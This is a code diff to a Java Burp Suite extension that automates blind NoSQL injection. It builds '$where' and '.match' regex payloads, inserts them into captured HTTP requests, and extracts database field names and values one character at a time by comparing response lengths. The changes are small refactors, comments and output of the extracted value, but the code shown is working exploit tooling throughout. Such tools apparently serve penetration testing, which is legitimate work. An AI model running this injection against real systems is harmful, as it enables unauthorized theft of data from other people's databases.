@@ -413,14 +413,15 @@ public class NNN implements BurpExtension {
                                 ch = characters.charAt(i);
                                 StringBuilder payload = new StringBuilder();
                                 payload.append(", \"$where\":\" Object.keys(this)[");
-                                payload.append(Integer.toString(number));
+                                payload.append(number);
                                 payload.append("].match('^.{");
-                                payload.append(Integer.toString(position));
+                                payload.append(position);
                                 payload.append("}");
                                 payload.append(ch);
                                 payload.append(".*')\"");
                                 request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, index) + payload + requestResponse.request().toString().substring(index));
                                 response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                                // looking for the first packet with different length than others
                                 if (response1 == null){
                                     response1 = response2receive;
                                 } else if (response2 == null && response2receive.response().toString().length() != response1.response().toString().length()){
@@ -489,12 +490,13 @@ public class NNN implements BurpExtension {
                             ch = characters.charAt(i);
                             StringBuilder payload = new StringBuilder();
                             payload.append(".match('^.{");
-                            payload.append(Integer.toString(position));
+                            payload.append(position);
                             payload.append("}");
                             payload.append(ch);
                             payload.append(".*')");
                             request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, endIndex) + payload + requestResponse.request().toString().substring(endIndex));
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                            // looking for the first packet with different length than others
                             if (response1 == null){
                                 response1 = response2receive;
                             } else if (response2 == null && response2receive.response().toString().length() != response1.response().toString().length()){
@@ -514,6 +516,10 @@ public class NNN implements BurpExtension {
                             break;
                         }
                         position++;
+                    }
+                    infoPane.setText(infoPane.getText() + "\n");
+                    if (!sb.isEmpty()){
+                        infoPane.setText(infoPane.getText() + "[i] Extracted field value: " + sb + "\n");
                     }
                 }
             } catch (Exception e) {
